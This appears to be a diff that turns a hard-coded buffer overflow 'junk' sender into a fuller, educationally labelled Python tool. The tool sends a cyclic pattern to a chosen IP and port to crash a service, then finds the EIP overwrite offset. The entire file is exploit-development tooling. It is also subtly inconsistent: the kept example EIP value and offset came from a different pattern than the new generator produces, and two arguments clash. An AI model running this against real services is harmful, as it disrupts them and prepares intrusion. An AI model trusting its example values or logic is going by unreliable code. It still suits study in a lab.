@@ -1,17 +1,166 @@
+#!/usr/bin/env python3
+"""
+Buffer Overflow Offset Discovery Script
+=======================================
+
+This script uses a cyclic pattern to identify the exact offset
+where the EIP register is overwritten in a buffer overflow.
+
+Usage: python3 offset.py <target_ip> <target_port> [pattern_length]
+
+Author: CEH Study Guide
+Purpose: Educational - Buffer Overflow Offset Detection
+"""
+
 import sys
 import socket
+import argparse
+import string
 
-junk  = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"
+def create_cyclic_pattern(length):
+    """
+    Create a cyclic pattern for offset identification
+    
+    Args:
+        length (int): Length of the pattern to generate
+    
+    Returns:
+        str: Cyclic pattern string
+    """
+    alphabet = string.ascii_uppercase + string.ascii_lowercase + string.digits
+    pattern = ""
+    
+    for a in alphabet:
+        for b in alphabet:
+            for c in alphabet:
+                if len(pattern) < length:
+                    pattern += a + b + c
+                else:
+                    return pattern[:length]
+    
+    return pattern[:length]
 
-# Establish Connection and Send Junk
-try:
-	conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	conn.connect(("127.0.0.1",8888))
-	conn.send(junk)
-	conn.close()
-	sys.exit()
-except Exception as error:
-	print("Error Occur " + error)
+def find_offset(pattern, eip_value):
+    """
+    Find offset in cyclic pattern based on EIP value
+    
+    Args:
+        pattern (str): Original cyclic pattern
+        eip_value (str): EIP value in hex format (e.g., "316A4230")
+    
+    Returns:
+        int: Offset position or -1 if not found
+    """
+    try:
+        # Convert hex EIP to ASCII (little endian)
+        eip_bytes = bytes.fromhex(eip_value)
+        eip_ascii = eip_bytes[::-1].decode('latin-1')  # Reverse for little endian
+        
+        offset = pattern.find(eip_ascii)
+        return offset
+    except:
+        return -1
 
-## EIP Address = 316A4230
-## Offset = 1052
+def send_pattern_payload(target_ip, target_port, pattern, timeout=5):
+    """
+    Send cyclic pattern to target service
+    
+    Args:
+        target_ip (str): Target IP address
+        target_port (int): Target port number
+        pattern (str): Cyclic pattern to send
+        timeout (int): Connection timeout
+    
+    Returns:
+        bool: True if sent successfully
+    """
+    try:
+        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        conn.settimeout(timeout)
+        conn.connect((target_ip, target_port))
+        conn.send(pattern.encode('latin-1'))
+        conn.close()
+        return True
+        
+    except Exception as e:
+        print(f"[-] Connection error: {e}")
+        return False
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Buffer Overflow Offset Discovery Tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  # Send pattern and crash service
+  python3 offset.py 192.168.1.100 9999 2000
+  
+  # Find offset from EIP value
+  python3 offset.py --find-offset 316A4230 --pattern-length 2000
+  
+Steps:
+  1. Run with target IP/port to send cyclic pattern
+  2. Check debugger for EIP value (e.g., 316A4230)
+  3. Use --find-offset with EIP value to get exact offset
+        """
+    )
+    
+    parser.add_argument('target_ip', nargs='?', help='Target IP address')
+    parser.add_argument('target_port', nargs='?', type=int, help='Target port number')
+    parser.add_argument('pattern_length', nargs='?', type=int, default=2000,
+                       help='Length of cyclic pattern (default: 2000)')
+    parser.add_argument('--find-offset', help='Find offset from EIP hex value')
+    parser.add_argument('--pattern-length', type=int, default=2000,
+                       help='Pattern length for offset calculation')
+    parser.add_argument('--generate-pattern', type=int,
+                       help='Generate cyclic pattern of specified length')
+    
+    args = parser.parse_args()
+    
+    # Generate pattern only
+    if args.generate_pattern:
+        pattern = create_cyclic_pattern(args.generate_pattern)
+        print(f"[+] Generated cyclic pattern ({args.generate_pattern} bytes):")
+        print(pattern)
+        return
+    
+    # Find offset from EIP value
+    if args.find_offset:
+        pattern = create_cyclic_pattern(args.pattern_length)
+        offset = find_offset(pattern, args.find_offset)
+        
+        if offset != -1:
+            print(f"[+] EIP Offset found: {offset}")
+            print(f"[+] EIP overwritten at position: {offset}")
+            print(f"[+] Pattern before EIP: '{pattern[:offset]}'")
+            print(f"[+] EIP value: '{pattern[offset:offset+4]}'")
+        else:
+            print(f"[-] Could not find offset for EIP value: {args.find_offset}")
+            print(f"[-] Make sure the EIP value is correct and pattern length is sufficient")
+        return
+    
+    # Send pattern to target
+    if not args.target_ip or not args.target_port:
+        parser.print_help()
+        return
+    
+    pattern_length = args.pattern_length or 2000
+    pattern = create_cyclic_pattern(pattern_length)
+    
+    print(f"[+] Generating cyclic pattern of {pattern_length} bytes")
+    print(f"[+] Sending pattern to {args.target_ip}:{args.target_port}")
+    print(f"[+] Pattern preview: {pattern[:100]}...")
+    
+    if send_pattern_payload(args.target_ip, args.target_port, pattern):
+        print(f"[+] Pattern sent successfully!")
+        print(f"[*] Check debugger for EIP value")
+        print(f"[*] Then run: python3 {sys.argv[0]} --find-offset <EIP_HEX> --pattern-length {pattern_length}")
+    else:
+        print(f"[-] Failed to send pattern")
+
+if __name__ == "__main__":
+    main()
+
+# Example EIP values and their offsets:
+# EIP Address = 316A4230 (from original comment)
+# Offset = 1052 (from original comment)
